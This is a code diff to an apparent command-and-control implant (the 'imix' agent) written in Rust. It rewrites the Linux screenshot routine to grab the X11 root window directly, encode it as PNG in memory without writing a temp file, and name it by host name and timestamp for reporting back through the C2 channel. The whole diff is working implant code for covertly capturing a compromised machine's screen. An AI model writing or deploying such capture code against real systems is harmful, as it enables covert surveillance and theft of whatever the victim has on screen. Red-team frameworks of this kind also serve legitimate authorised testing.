@@ -19,12 +19,13 @@ use {
     alloc::format,
     alloc::string::{String, ToString},
     alloc::vec::Vec,
+    image::{ImageBuffer, RgbaImage},
     pb::c2::report_file_request,
     pb::{c2, eldritch},
-    std::env::temp_dir,
-    std::path::PathBuf,
-    std::process::Command,
+    std::io::Cursor,
     std::sync::Mutex,
+    x11rb::connection::Connection,
+    x11rb::protocol::xproto::{ConnectionExt, ImageFormat},
 };
 
 #[cfg(all(unix, feature = "stdlib"))]
@@ -57,27 +58,44 @@ pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String>
         .unwrap_or_default()
         .as_secs();
 
-    let uuid = uuid::Uuid::new_v4().to_string();
-    let mut temp_file = temp_dir();
-    temp_file.push(format!("imix_screenshot_{}.png", uuid));
+    let (conn, screen_num) = x11rb::connect(None)
+        .map_err(|e| format!("Failed to connect to X11 server: {:?}", e))?;
 
-    let temp_file_str = temp_file.to_string_lossy().to_string();
+    let screen = &conn.setup().roots[screen_num];
+    let root_window = screen.root;
+    let width = screen.width_in_pixels;
+    let height = screen.height_in_pixels;
 
-    // Try to take a screenshot using scrot
-    let status = Command::new("scrot")
-        .arg(&temp_file_str)
-        .status()
-        .map_err(|e| format!("Failed to execute scrot: {}", e))?;
+    let image = conn.get_image(
+        ImageFormat::Z_PIXMAP,
+        root_window,
+        0,
+        0,
+        width,
+        height,
+        !0,
+    ).map_err(|e| format!("Failed to get image from X11: {:?}", e))?
+    .reply().map_err(|e| format!("Failed to get image reply from X11: {:?}", e))?;
 
-    if !status.success() {
-        return Err(format!("scrot failed with status: {}", status));
+    let data = image.data;
+
+    // X11 returns BGRA, image crate expects RGBA
+    let mut rgba_data = Vec::with_capacity(data.len());
+    for chunk in data.chunks_exact(4) {
+        rgba_data.push(chunk[2]); // R
+        rgba_data.push(chunk[1]); // G
+        rgba_data.push(chunk[0]); // B
+        rgba_data.push(chunk[3]); // A
     }
 
-    let png_data = std::fs::read(&temp_file_str)
-        .map_err(|e| format!("Failed to read screenshot file: {}", e))?;
+    let img: RgbaImage = ImageBuffer::from_raw(width as u32, height as u32, rgba_data)
+        .ok_or_else(|| "Failed to create ImageBuffer from X11 data".to_string())?;
 
-    // Clean up
-    let _ = std::fs::remove_file(&temp_file_str);
+    let mut buffer = Cursor::new(Vec::new());
+    img.write_to(&mut buffer, image::ImageFormat::Png)
+        .map_err(|e| format!("Failed to encode image as PNG: {:?}", e))?;
+
+    let png_data = buffer.into_inner();
 
     let filename = format!("screenshot_{}_{}_0.png", hostname, timestamp);
 
@@ -178,7 +196,7 @@ pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String>
         // Convert to PNG
         let mut buffer = Cursor::new(Vec::new());
         image
-            .write_to(&mut buffer, ImageFormat::Png)
+            .write_to(&mut buffer, image::ImageFormat::Png)
             .map_err(|e| e.to_string())?;
         let png_data = buffer.into_inner();
 
